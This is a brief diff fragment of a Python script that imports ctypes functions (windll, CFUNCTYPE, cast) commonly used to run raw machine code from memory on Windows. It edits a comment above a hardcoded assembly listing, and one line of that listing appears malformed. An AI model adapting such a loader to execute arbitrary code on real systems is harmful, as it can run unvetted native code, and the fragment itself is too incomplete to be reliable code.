@@ -2,7 +2,7 @@ import re
 import argparse
 from ctypes import windll, c_char_p, c_void_p, cast, CFUNCTYPE, byref, c_uint32
 
-# Hardcoded assembly with comments (no addresses/opcodes)
+# Hardcoded assembly
 ASSEMBLY_CODE = """
 ja     0x402032
 BYTE PTR [eax],al
